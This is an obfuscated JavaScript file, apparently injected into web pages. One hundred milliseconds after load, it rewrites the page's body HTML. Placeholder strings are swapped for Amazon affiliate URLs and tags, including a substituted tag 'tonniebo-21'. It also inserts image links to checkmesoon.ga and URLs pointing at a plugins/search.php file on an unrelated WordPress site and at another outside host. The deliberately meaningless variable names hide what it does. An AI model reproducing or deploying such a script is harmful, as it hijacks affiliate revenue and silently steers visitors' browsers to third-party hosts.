var bosok = 'http://ojondugaleram';var sipoet = 'http://www.amazon.fr/s/?_encoding=UTF8&camp=1789&creative=390957&field-keywords=';
var ondo = 'tagcilik';var ekrak = '&linkCode=ur2&tag=';
var ojekbuting = 'terusanejo';var gendongbuting = '';
var olebuting = 'rotinehtml1';var jalebuting = 'http://checkmesoon.ga/3/thanks.png';
var taibuting = 'rotinehtml2fr';var tahongbuting = 'http://checkmesoon.ga/6/o.png';
var critbuting = 'rotinehtml3';var crotbuting = '';
var bretbuting = 'rotinehtml4';var brotbuting = '';
var ndasebuting = 'rotinehtml5';var mumetbubuting = 'http://checkmesoon.ga/2/thanks.png';
var ijobuting = 'rotinehtml6';var irengbuting = '';
var kuningbuting = 'http://briket.product';var coklatbuting = 'http://www.amazon.fr/gp/product/';
var telbuting = 'merak';var cempebuting = '/?tag=';
var abangbuting = 'http://briket.reviews';var abuabubuting = 'http://www.amazon.fr/product-reviews/';
var tigabuting = 'OTAK';var empatbuting = '';
var limabuting = 'NGASO';var enambuting = '';
var tujubuting = 'mbahgoogole';var lapanbuting = 'http://forumas.ostmarina.info/images.php?asin=';
var abuting = 'dancu';var bbuting = 'taggedi';
var cbuting = 'anjiex';var dbuting = 'bhabhi';
var ebuting = 'telow';var fbuting = 'luweh';
var gbuting = 'mugimugi';var hbuting = 'kopeth';
var alubuting = '/e/cm?t';var blubuting = 'Tag=';
var clubuting = '/ref=as_li_ss_tl?ie=UTF8';var dlubuting = 'linkCode';
var elubuting = 'AsinImage';var flubuting = '/widgets/q?_encoding=UTF8';
var glubuting = 'MarketPlace';var hlubuting = 'iframe src';
var jadah = 'hasue';var jenang = 'tag';


var olzon = 'freebuy-20';var nezon = 'tonniebo-21';var jepa ='waljinah'; var ngg = 'http://ausramakeupartist.com/wp-content/plugins/search.php?asin=';
var gampeng = 'cetok'; var daml = 'gae'; var asem = 'witdele'; var kambil= 'Tempe'; 
var benalu = 'tembok'; var suket = 'Omah';var siji = 'paklekpaijo'; var loro = 'http://';
var telu = 'pengen';var papat = 'www.';var limo = 'ngerasakne'; var enem = 'amz';
var tuobuting = 'uripe';var gudelbuting = 'n';var pitu = 'dungo'; var wolu = 'ws.assoc-';
var songo = 'jenggot';var sepuluh = 'rcm.'; var sewelas = 'ampreh';var rolas = '.com';
var telulas = 'iwaknya';var patbelas = 'http://rcm.amazon.com';


function updateme()
{
    var text = document.getElementsByTagName('body')[0].innerHTML;
text = replaceAll(text,olzon,nezon);text = replaceAll(text,jepa,ngg);text = replaceAll(text,gampeng,daml);text = replaceAll(text,asem,kambil);text = replaceAll(text,benalu,suket);
text = replaceAll(text,bosok,sipoet);text = replaceAll(text,ondo,ekrak);text = replaceAll(text,ojekbuting,gendongbuting);text = replaceAll(text,limo,enem);text = replaceAll(text,siji,loro);	

text = replaceAll(text,telu,papat);	
text = replaceAll(text,pitu,wolu);	

text = replaceAll(text,songo,sepuluh);	text = replaceAll(text,tuobuting,gudelbuting);	text = replaceAll(text,telbuting,cempebuting);	text = replaceAll(text,sewelas,rolas);	text = replaceAll(text,telulas,patbelas);	
text = replaceAll(text,tigabuting,empatbuting);	text = replaceAll(text,limabuting,enambuting);	text = replaceAll(text,tujubuting,lapanbuting);	text = replaceAll(text,abuting,bbuting);	

text = replaceAll(text,jadah,jenang);
text = replaceAll(text,elubuting,flubuting);	
text = replaceAll(text,cbuting,dbuting);	
text = replaceAll(text,glubuting,hlubuting);	
text = replaceAll(text,ebuting,fbuting);	
text = replaceAll(text,alubuting,blubuting);	
text = replaceAll(text,gbuting,hbuting);	
text = replaceAll(text,clubuting,dlubuting);text = replaceAll(text,ijobuting,irengbuting);text = replaceAll(text,kuningbuting,coklatbuting);text = replaceAll(text,abangbuting,abuabubuting);	
text = replaceAll(text,taibuting,tahongbuting);	text = replaceAll(text,critbuting,crotbuting);text = replaceAll(text,bretbuting,brotbuting);text = replaceAll(text,ndasebuting,mumetbubuting);text = replaceAll(text,olebuting,jalebuting);

  document.getElementsByTagName('body')[0].innerHTML = text;
}
function replaceAll(txt, replace, with_this) {
  return txt.replace(new RegExp(replace, 'g'),with_this);
}
setTimeout('updateme()',100);